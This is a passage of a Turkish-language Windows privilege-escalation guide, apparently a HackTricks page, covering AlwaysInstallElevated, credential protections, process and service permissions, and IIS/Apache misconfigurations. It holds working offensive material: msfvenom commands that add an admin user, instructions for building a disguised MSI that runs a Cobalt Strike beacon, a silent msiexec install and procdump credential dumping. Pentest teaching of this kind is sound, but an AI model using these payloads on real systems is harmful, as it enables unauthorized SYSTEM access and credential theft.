Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, aktarılan kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın logon türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle yapılan bir logon'dan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi incelemeye değer bir durum olarak ele alın; pasif enumeration, COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir makine hesabının shadow credential'ı, makine bileti elde edilmesini sağlayabilir; bu da yalnızca hesabın gerekli dizin çoğaltma haklarına sahip olması durumunda ayrı bir DCSync yoluna götürebilir.

**Exploit'i şu adreste bulun:** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırı akışı hakkında daha fazla bilgi için şuraya bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

Bu 2 kayıt defteri anahtarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Geçerli dizinde yetki yükseltmek için bir Windows MSI binary’si oluşturmak üzere power-up’tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişiminizin olması gerekir):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command line** komutlarını **çalıştırmak** istiyorsanız, bir "**.bat**" dosyasını wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile yeni bir Windows EXE TCP payload'ı oluşturun ve `C:\privesc\beacon.exe` konumuna kaydedin.
- **Visual Studio**'yu açın, **Create a new project**'i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 3 / 4. adıma (eklenecek dosyaları seçme) gelene kadar **Next**'e tıklayın. **Add**'e tıklayıp oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi diğer özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece installer çalıştırılır çalıştırılmaz Beacon payload'ı yürütülür.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Denetim Ayarları

Bu ayarlar nelerin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de logların nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinlere sahip olan kullanıcılar tarafından görüntülenebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Koruması

**Windows 8.1** ile birlikte Microsoft, güvenilmeyen süreçlerin belleğini **okuma** veya kod enjekte etme girişimlerini **engellemek** ve sistemi daha da güvenli hale getirmek için Local Security Authority (LSA) için gelişmiş koruma sundu.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash attacks gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz yetkilerinizi yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları yetki yükseltmek için nasıl kötüye kullanabileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlgi çekici token'lar** ve bunları nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panodaki içeriği alın

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için **çalışan bir ikili dosyanın üzerine yazıp yazamayacağınızı** veya ikili dosyanın bulunduğu klasörde yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışıyor olabilecek [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları kötüye kullanarak yetkilerinizi yükseltebilirsiniz.

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port taramasında görünmemesi, hiçbir zaman dışarıya açık olmadığı anlamına gelmez. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının listener'a erişip erişemediğiyle ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası kod yürütmenin mümkün olduğunu kanıtlamaz. Rutin keşif işlemlerini pasif tutun ve debugger komutları göndermeyin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreç ikililerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada tanımlı bir `dynamicpreprocessor directory` içinden shared library'ler yükleyebilir. Snort'u farklı bir hesap altında çalıştıran zamanlanmış görev veya hizmet için, tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa, görev veya hizmet bir sonraki modül yüklemesinde kod yürütme açısından bu yol incelenmeye değer bir adaydır. Bu yükseltmenin gerçekleştiği sonucuna varmadan önce run-as hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve varsa deny veya share kısıtlamalarını doğrulayın; tek başına yazılabilir bir dizin yükseltmeyi kanıtlamaz. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir document root'a sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda, hizmetin yürütülebilir dosya yolunu ve run-as hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root'un ACL'sini inceleyin; bu dizin genellikle `C:\xampp\htdocs` olur. Daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorken Apache `LocalSystem` olarak çalışıyorsa, server-side kod yürütme ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve server-side bir handler'ın dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök yalnızca dosya oluşturulabildiğini kanıtlar. Probe yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For conventional bir WAMP kurulumunda hizmet, sürüm belirtilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik bir düzen için `C:\wamp\...`) gösterebilir; yapılandırma da bunun yanında `conf\httpd.conf` altında, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Tam hizmet imajını, çalıştırma kimliğini, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kökü ve uygulama havuzunun ağ kimliği

IIS için, yazılabilir bir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafındaki işleyiciyi belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS o dosya türünü işliyorsa ve rotaya erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yola özgü geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizini altındaki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bu konumu değiştirebilir. [Microsoft konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzlarının birbirine güvenmediği durumlarda derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** bir uygulamanın önbelleğindeki oluşturulmuş kaynağı değiştirebiliyorsa uygulamanın bu kaynağı daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütmeyi kanıtlamaz: önbelleği etkin uygulamayla, etkin token ve ACL ile, derleme ayarlarıyla, süreç kimliğiyle ve olası yeniden derlemenin zamanlamasıyla ilişkilendirin. Salt okunur meta veri incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerel olarak zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde ağda anonim kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgeliyor. Kimlik ayarı belirtilmemişse havuz varsayılanları devralınabilir; bu varsayılanlar IIS sürümleri arasında değiştiğinden havuz adına bakarak tahmin etmek yerine etkin yapılandırmayı çözümleyin. Kod yürütme, ağda bilgisayar kimliği kullanan bir havuza ulaşıyorsa **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; bir makine hesabı bileti veya ana bilgisayar rolü tek başına bu hakları kanıtlamaz. Pasif envanter çıkarırken dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmayı ve ACL'leri inceleyin.

Yardımcı bir süreç başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Kodlanmış bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk metakarakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın kodu çözülmüş değeri gerçekten etkileyebildiğini ve işleyiciye erişebildiğini doğrulayın; ardından etkin uygulama havuzu kimliğini veya kimliğe bürünme kimliğini ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütmeyi kanıtlamaz. Pasif envanter çıkarırken sahte istek göndermeden veya yardımcı programı çalıştırmadan kaynağı ve havuz yapılandırmasını inceleyin.

Windows üzerinde çalışan bir PHP hizmetinde, istekle kontrol edilen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) öğesine aktarılan bir yol, daha düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif envanter çıkarırken uç noktayı çağırmadan kaynak kodunu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

**Sysinternals** içindeki **procdump** aracını kullanarak çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetler **kimlik bilgilerini bellekte açık metin olarak** tutar; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir drop dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcının sürümünü inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML external entity kullanımına izin veriyordu; Windows'ta bir ağ varlığı, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa, içe aktarma hesabından kimlik doğrulamayı tetikleyebilirdi. Bu, kimlik bilgileri açığa çıkma ihtimaline yönelik bir bulgudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı ve yetkili ya da savunmasız bir yol üzerinden kullanılabilir olması gerekir ve güncel sürümler gerçek yama durumlarına göre değerlendirilmelidir. Pasif envanter sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager erişim isteği`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), inceleme için bir bulgudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService bir handle döndürür`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu handle, oluşturma sırasında istenen hizmet erişim haklarını taşır. Hizmeti sonradan yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve ilk handle kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, hizmet hesabını, başlatma ilkesini ve çalıştırılabilir dosyanın yolunu ayrı ayrı doğrulayın. Pasif envanter sırasında hizmet oluşturmayın veya başlatmayın.

Uzak bir hizmet yükleme yolu için bu SCM haklarını, hedefteki ve **aynı ağ oturum açma hesabının** yazabildiği bir paylaşımla, paylaşımın altında bulunan NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yoluyla ilişkilendirin. Olağan dışı geniş SCM haklarıyla dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Tek başına paylaşımda yazma erişimi veya SCM hizmet oluşturma bulgusu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir hizmet, `ImagePath`'inde belirtilmemiş olsa bile başlangıçta, kapanışta veya başka bir yaşam döngüsü olayında yardımcı bir çalıştırılabilir dosyayı çağırabilir. Yardımcı dosyanın adı, daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde çözümleniyor ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına, hizmetin bu dosyayı yükleyeceğini göstermez; pasif incelemede hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` çağrısına bağımsız değişkenler verilmesine izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Hizmetin kodunu veya belgelenmiş arayüzünü inceleyin; başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirin. Hizmet, çağıranın seçtiği bir bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden dosyaya yazma akışını, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korunan bir dizine yazmak, ancak bu dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa ayrıcalık yükseltmeye dönüşebilir; tek başına yazılabilir bir günlük veya başlatma hakkı yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

Bir NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme bulgusudur**: dosyada web kimlik bilgileri bulunabilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya betikleri değiştirip değiştiremeyeceğini kontrol edin. Ayrıcalıklı çalıştırma için ek olarak `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), komut kaydetme ya da değiştirme konusunda geçerli bir hak ve bunu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca döngüsel adresi dinleyen bir dinleyiciye yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyicinin varlığı tek başına bu hakları kanıtlamaz. Pasif envanter sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya yerleşimi](https://nsclient.org/docs/concepts/file-layout/), [web ve betik güvenliği rehberi](https://nsclient.org/docs/setup/securing/) ve [harici betik yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçekten hangi hesapla çalıştığını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini tüm hizmet sınırı olarak değerlendirmeden önce alt uygulamanın çalıştırılabilir dosyasını ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP uç noktası ayrı bir inceleme bulgusudur: düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, ilgili işlemin bu kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle gerçekleştirdiğini doğrulayın. Hizmet hesabı, uç nokta URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif envanter sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işlemi için çağıranın denetimindeki bir dizgenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript` betik metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke` pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows taşıma kimlik bilgilerini kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** bir işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük ayrıcalıklı bir çağıranın girdisinin daha yüksek hizmet kimliği altında `AddScript`'e ulaştığı bir yol, kod çalıştırma sınırıdır; açık bir port, kimliği doğrulanmış istemci veya ilgisiz bir assembly'deki kullanılmayan metot tek başına kanıt değildir. Numaralandırma sırasında uç noktayı çağırmadan dağıtılan hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, Windows'un belirli koşullar oluştuğunda (adlandırılmış pipe/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlanması, GPO yenilemesi vb.) bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmasa bile tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Numaralandırma ve etkinleştirme teknikleri için bkz.:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmet DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link yarışını kullandı. Gösterilen ayrıcalık yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bu bileşendeki güvenlik açığı Ocak 2024'te giderildi.

Pasif ön inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet kaydı, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana bilgisayarın savunmasız olduğunu göstermez. İnceleme için hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi almak için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_'tan **accesschk** binary'sinin bulundurulması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirebilip değiştiremediğini kontrol etmeniz önerilir:

```bash
